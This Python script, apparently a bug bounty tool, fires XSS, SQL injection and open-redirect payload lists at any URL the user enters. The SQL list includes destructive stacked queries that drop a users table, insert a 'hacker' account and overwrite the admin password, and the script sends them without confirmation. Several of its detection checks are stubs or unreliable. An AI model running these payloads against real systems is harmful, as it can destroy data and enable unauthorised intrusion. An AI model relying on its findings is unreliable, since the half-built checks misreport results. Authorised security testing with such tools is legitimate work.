#!/usr/bin/env python3
"""
Advanced Bug Scanner for Bug Bounty
Scans for XSS, SQL Injection, and Open Redirect vulnerabilities

Author: Security Researcher
Version: 1.0.0
"""

import requests
import re
import json
import time
import threading
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
from tqdm import tqdm
import concurrent.futures
from fake_useragent import UserAgent
import random
import string

# Initialize colorama for colored output
init(autoreset=True)

class BugScanner:
    """
    Advanced bug scanner that detects XSS, SQL Injection, and Open Redirect vulnerabilities
    """
    
    def __init__(self, target_url, output_dir="scan_results"):
        """
        Initialize the bug scanner
        
        Args:
            target_url (str): Target URL to scan
            output_dir (str): Directory to save results
        """
        self.target_url = target_url
        self.output_dir = output_dir
        self.session = requests.Session()
        self.ua = UserAgent()
        self.vulnerabilities = []
        
        # Set up session headers
        self.session.headers.update({
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        
        self.print_banner()
    
    def print_banner(self):
        """Print scanner banner"""
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗
║                      ADVANCED BUG SCANNER                        ║
║                    XSS | SQLi | Open Redirect                    ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.YELLOW}Target: {self.target_url}
Output Directory: {self.output_dir}
Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}
"""
        print(banner)
    
    def log(self, message, level="INFO"):
        """Log messages with timestamps and colors"""
        timestamp = time.strftime('%H:%M:%S')
        colors = {
            'INFO': Fore.BLUE,
            'SUCCESS': Fore.GREEN,
            'WARNING': Fore.YELLOW,
            'ERROR': Fore.RED,
            'VULNERABILITY': Fore.MAGENTA
        }
        color = colors.get(level, Fore.WHITE)
        print(f"{color}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")
    
    def save_vulnerabilities(self):
        """Save vulnerabilities to JSON file"""
        import os
        os.makedirs(self.output_dir, exist_ok=True)
        output_file = os.path.join(self.output_dir, f"vulnerabilities_{int(time.time())}.json")
        with open(output_file, 'w') as f:
            json.dump(self.vulnerabilities, f, indent=2)
        self.log(f"Vulnerabilities saved to {output_file}", "SUCCESS")
    
    def scan_xss(self, url, parameters):
        """
        Scan for Cross-Site Scripting (XSS) vulnerabilities
        
        Args:
            url (str): Target URL
            parameters (list): List of parameters to test
        """
        self.log("Starting XSS vulnerability scan...", "INFO")
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
            "<table background=\"javascript:alert('XSS')\">",
            "<object data=\"javascript:alert('XSS')\">",
            "<embed src=\"javascript:alert('XSS')\">",
            "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">",
            "<style>@import'javascript:alert(\"XSS\")';</style>",
            "<style>body{-moz-binding:url(\"javascript:alert('XSS')\")}</style>",
            "<div style=\"background-image:url(javascript:alert('XSS'))\">",
            "<div style=\"width:expression(alert('XSS'))\">",
            "<div style=\"background:url('javascript:alert(\\'XSS\\')')\">",
            "<div style=\"background:url('data:text/html,<script>alert(\\'XSS\\')</script>')\">",
            "<div style=\"background:url('vbscript:msgbox(\\'XSS\\')')\">",
            "<div style=\"background:url('data:text/html,<svg onload=alert(\\'XSS\\')>')\">",
            "<div style=\"background:url('data:text/html,<img src=x onerror=alert(\\'XSS\\')>')\">"
        ]
        
        for param in tqdm(parameters, desc="XSS Testing"):
            for payload in xss_payloads:
                try:
                    # Test reflected XSS
                    test_url = f"{url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=5)
                    
                    if self.check_xss_reflection(response, payload):
                        vulnerability = {
                            'type': 'XSS',
                            'subtype': 'Reflected XSS',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'severity': 'High',
                            'description': f'Reflected XSS found in parameter {param}',
                            'evidence': f'Payload reflected in response: {payload}'
                        }
                        self.vulnerabilities.append(vulnerability)
                        self.log(f"XSS vulnerability found in parameter: {param}", "VULNERABILITY")
                    
                    # Test stored XSS (simplified)
                    if self.check_stored_xss(response, payload):
                        vulnerability = {
                            'type': 'XSS',
                            'subtype': 'Stored XSS',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'severity': 'Critical',
                            'description': f'Potential stored XSS in parameter {param}',
                            'evidence': f'Payload may be stored: {payload}'
                        }
                        self.vulnerabilities.append(vulnerability)
                        self.log(f"Potential stored XSS found in parameter: {param}", "VULNERABILITY")
                
                except Exception as e:
                    continue
        
        self.log(f"XSS scan completed. Found {len([v for v in self.vulnerabilities if v['type'] == 'XSS'])} vulnerabilities", "SUCCESS")
    
    def check_xss_reflection(self, response, payload):
        """Check if XSS payload is reflected in response"""
        try:
            # Check if payload is reflected without proper encoding
            if payload in response.text:
                return True
            
            # Check for common XSS patterns
            xss_patterns = [
                r'<script[^>]*>.*alert.*</script>',
                r'javascript:alert',
                r'onerror=alert',
                r'onload=alert',
                r'onfocus=alert',
                r'onclick=alert'
            ]
            
            for pattern in xss_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return True
            
            return False
        except:
            return False
    
    def check_stored_xss(self, response, payload):
        """Check for potential stored XSS"""
        try:
            # This is a simplified check - in real implementation, you would
            # need to submit the payload and then check if it appears in other responses
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check if payload appears in form fields or content areas
            for tag in soup.find_all(['input', 'textarea', 'div', 'span', 'p']):
                if payload in str(tag):
                    return True
            
            return False
        except:
            return False
    
    def scan_sql_injection(self, url, parameters):
        """
        Scan for SQL Injection vulnerabilities
        
        Args:
            url (str): Target URL
            parameters (list): List of parameters to test
        """
        self.log("Starting SQL Injection vulnerability scan...", "INFO")
        
        # SQL Injection payloads
        sql_payloads = [
            # Basic SQL injection
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR ('1'='1",
            "') OR (1=1--",
            "') OR (1=1#",
            "') OR (1=1/*",
            
            # Union-based SQL injection
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT user(),database(),version()--",
            "' UNION SELECT table_name,column_name,NULL FROM information_schema.columns--",
            
            # Boolean-based blind SQL injection
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)=0--",
            
            # Time-based blind SQL injection
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SELECT SLEEP(5)--",
            "'; SELECT pg_sleep(5)--",
            "'; SELECT dbms_pipe.receive_message((SELECT version()),5)--",
            
            # Error-based SQL injection
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(schema_name AS CHAR),0x7e)) FROM information_schema.schemata LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # Stacked queries
            "'; DROP TABLE users; --",
            "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
            "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
            
            # Second-order SQL injection
            "admin'--",
            "admin'/*",
            "admin'#",
            
            # NoSQL injection (for MongoDB, etc.)
            "' || '1'=='1",
            "' || 1==1",
            "'; return true; //",
            "'; return false; //"
        ]
        
        for param in tqdm(parameters, desc="SQLi Testing"):
            for payload in sql_payloads:
                try:
                    test_url = f"{url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=10)
                    
                    if self.check_sql_injection(response, payload):
                        vulnerability = {
                            'type': 'SQL Injection',
                            'subtype': self.determine_sql_type(payload),
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'severity': 'Critical',
                            'description': f'SQL Injection found in parameter {param}',
                            'evidence': f'SQL error or behavior detected with payload: {payload}'
                        }
                        self.vulnerabilities.append(vulnerability)
                        self.log(f"SQL Injection vulnerability found in parameter: {param}", "VULNERABILITY")
                
                except Exception as e:
                    continue
        
        self.log(f"SQL Injection scan completed. Found {len([v for v in self.vulnerabilities if v['type'] == 'SQL Injection'])} vulnerabilities", "SUCCESS")
    
    def check_sql_injection(self, response, payload):
        """Check if SQL injection is successful"""
        try:
            # Check for SQL error messages
            sql_errors = [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_.*",
                r"valid MySQL result",
                r"MySqlClient\.",
                r"PostgreSQL.*ERROR",
                r"Warning.*\Wpg_.*",
                r"valid PostgreSQL result",
                r"Npgsql\.",
                r"Microsoft.*ODBC.*SQL Server",
                r"SQLServer JDBC Driver",
                r"Microsoft OLE DB Provider for ODBC Drivers",
                r"Microsoft OLE DB Provider for SQL Server",
                r"Incorrect syntax near",
                r"ORA-\d{5}",
                r"Oracle error",
                r"Oracle.*Driver",
                r"Warning.*\Woci_.*",
                r"Warning.*\Wifx_.*",
                r"Exception.*Informix",
                r"Warning.*\Wsybase_.*",
                r"Sybase message",
                r"Sybase.*Server message.*",
                r"Warning.*\Wdb2_.*",
                r"DB2 SQL error",
                r"SQLSTATE.*SQLCODE",
                r"SQLException",
                r"SQLite.*error",
                r"SQLite3::SQLException",
                r"Warning.*\Wsqlite_.*",
                r"Warning.*\Wsqlite3_.*",
                r"SQLite error",
                r"SQLite3::SQLException",
                r"Warning.*\Wmssql_.*",
                r"Warning.*\Wsybase_.*",
                r"Warning.*\Woci_.*",
                r"Warning.*\Wifx_.*",
                r"Warning.*\Wdb2_.*",
                r"Warning.*\Wsqlite_.*",
                r"Warning.*\Wsqlite3_.*"
            ]
            
            for error_pattern in sql_errors:
                if re.search(error_pattern, response.text, re.IGNORECASE):
                    return True
            
            # Check for time-based SQL injection
            if any(keyword in payload.lower() for keyword in ['sleep', 'waitfor', 'delay']):
                # This would need to be implemented with timing checks
                pass
            
            # Check for boolean-based SQL injection
            if '1=1' in payload or '1=2' in payload:
                # This would need to be implemented with response comparison
                pass
            
            return False
        except:
            return False
    
    def determine_sql_type(self, payload):
        """Determine the type of SQL injection based on payload"""
        if 'UNION' in payload.upper():
            return 'Union-based SQL Injection'
        elif 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
            return 'Time-based Blind SQL Injection'
        elif '1=1' in payload or '1=2' in payload:
            return 'Boolean-based Blind SQL Injection'
        elif 'EXTRACTVALUE' in payload.upper() or 'CONCAT' in payload.upper():
            return 'Error-based SQL Injection'
        elif 'DROP' in payload.upper() or 'INSERT' in payload.upper() or 'UPDATE' in payload.upper():
            return 'Stacked Queries SQL Injection'
        else:
            return 'Basic SQL Injection'
    
    def scan_open_redirect(self, url, parameters):
        """
        Scan for Open Redirect vulnerabilities
        
        Args:
            url (str): Target URL
            parameters (list): List of parameters to test
        """
        self.log("Starting Open Redirect vulnerability scan...", "INFO")
        
        # Open redirect payloads
        redirect_payloads = [
            # External domains
            "http://evil.com",
            "https://evil.com",
            "//evil.com",
            "///evil.com",
            "////evil.com",
            
            # Protocol-relative URLs
            "//google.com",
            "//facebook.com",
            "//twitter.com",
            "//github.com",
            
            # URL encoding
            "%2F%2Fevil.com",
            "%2F%2F%2Fevil.com",
            "%2F%2F%2F%2Fevil.com",
            
            # Double encoding
            "%252F%252Fevil.com",
            "%252F%252F%252Fevil.com",
            
            # Mixed encoding
            "/%2Fevil.com",
            "/%252Fevil.com",
            
            # JavaScript URLs
            "javascript:alert('XSS')",
            "javascript:void(0)",
            "javascript:window.location='http://evil.com'",
            
            # Data URLs
            "data:text/html,<script>alert('XSS')</script>",
            "data:text/html,<meta http-equiv='refresh' content='0;url=http://evil.com'>",
            
            # Meta refresh
            "http://evil.com",
            "https://evil.com",
            
            # Relative paths that could be exploited
            "../../../evil.com",
            "..\\..\\..\\evil.com",
            
            # Null byte injection
            "http://evil.com%00",
            "https://evil.com%00",
            
            # CRLF injection
            "http://evil.com%0d%0a",
            "https://evil.com%0d%0a",
            
            # Unicode
            "http://evil.com\u0000",
            "https://evil.com\u0000"
        ]
        
        # Common redirect parameter names
        redirect_params = [
            'redirect', 'redirect_to', 'redirect_url', 'redirect_uri', 'redirect_uri',
            'return', 'return_to', 'return_url', 'return_uri',
            'next', 'next_url', 'next_uri',
            'url', 'uri', 'link', 'href', 'src',
            'goto', 'go', 'target', 'destination',
            'continue', 'callback', 'success_url', 'failure_url',
            'login_redirect', 'logout_redirect', 'auth_redirect',
            'page', 'path', 'route', 'action'
        ]
        
        # Test both provided parameters and common redirect parameters
        test_params = list(set(parameters + redirect_params))
        
        for param in tqdm(test_params, desc="Open Redirect Testing"):
            for payload in redirect_payloads:
                try:
                    test_url = f"{url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=5, allow_redirects=False)
                    
                    if self.check_open_redirect(response, payload):
                        vulnerability = {
                            'type': 'Open Redirect',
                            'subtype': 'Unvalidated Redirect',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'severity': 'Medium',
                            'description': f'Open Redirect found in parameter {param}',
                            'evidence': f'Redirects to external domain: {payload}'
                        }
                        self.vulnerabilities.append(vulnerability)
                        self.log(f"Open Redirect vulnerability found in parameter: {param}", "VULNERABILITY")
                
                except Exception as e:
                    continue
        
        self.log(f"Open Redirect scan completed. Found {len([v for v in self.vulnerabilities if v['type'] == 'Open Redirect'])} vulnerabilities", "SUCCESS")
    
    def check_open_redirect(self, response, payload):
        """Check if open redirect is successful"""
        try:
            # Check for redirect status codes
            if response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                
                # Check if redirect goes to external domain
                if self.is_external_redirect(location, payload):
                    return True
            
            # Check for meta refresh redirects
            if 'meta http-equiv="refresh"' in response.text.lower():
                if payload in response.text:
                    return True
            
            # Check for JavaScript redirects
            js_redirect_patterns = [
                r'window\.location\s*=\s*["\']([^"\']+)["\']',
                r'location\.href\s*=\s*["\']([^"\']+)["\']',
                r'location\.replace\s*\(\s*["\']([^"\']+)["\']',
                r'document\.location\s*=\s*["\']([^"\']+)["\']'
            ]
            
            for pattern in js_redirect_patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                for match in matches:
                    if self.is_external_redirect(match, payload):
                        return True
            
            return False
        except:
            return False
    
    def is_external_redirect(self, location, payload):
        """Check if redirect location is external"""
        try:
            if not location:
                return False
            
            # Parse the location URL
            parsed_location = urlparse(location)
            parsed_payload = urlparse(payload)
            
            # Check if it's an external domain
            if parsed_location.netloc and parsed_location.netloc != urlparse(self.target_url).netloc:
                return True
            
            # Check if payload domain appears in location
            if parsed_payload.netloc and parsed_payload.netloc in location:
                return True
            
            # Check for protocol-relative URLs
            if location.startswith('//'):
                return True
            
            # Check for JavaScript URLs
            if location.startswith('javascript:'):
                return True
            
            # Check for data URLs
            if location.startswith('data:'):
                return True
            
            return False
        except:
            return False
    
    def run_complete_scan(self, parameters):
        """
        Run complete vulnerability scan
        
        Args:
            parameters (list): List of parameters to test
        """
        self.log("Starting complete vulnerability scan...", "CRITICAL")
        
        try:
            # Scan for XSS
            self.scan_xss(self.target_url, parameters)
            
            # Scan for SQL Injection
            self.scan_sql_injection(self.target_url, parameters)
            
            # Scan for Open Redirect
            self.scan_open_redirect(self.target_url, parameters)
            
            # Save results
            self.save_vulnerabilities()
            
            self.log(f"Vulnerability scan completed! Found {len(self.vulnerabilities)} total vulnerabilities", "SUCCESS")
            return self.vulnerabilities
            
        except Exception as e:
            self.log(f"Error during vulnerability scan: {e}", "ERROR")
            return None

if __name__ == "__main__":
    # Example usage
    target = input("Enter target URL: ").strip()
    if target:
        scanner = BugScanner(target)
        # Example parameters - in real usage, these would come from reconnaissance
        example_params = ['id', 'page', 'search', 'q', 'url', 'redirect', 'return']
        vulnerabilities = scanner.run_complete_scan(example_params)
        if vulnerabilities:
            print(f"\n{Fore.GREEN}Scan completed! Found {len(vulnerabilities)} vulnerabilities.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Please provide a valid target URL.{Style.RESET_ALL}")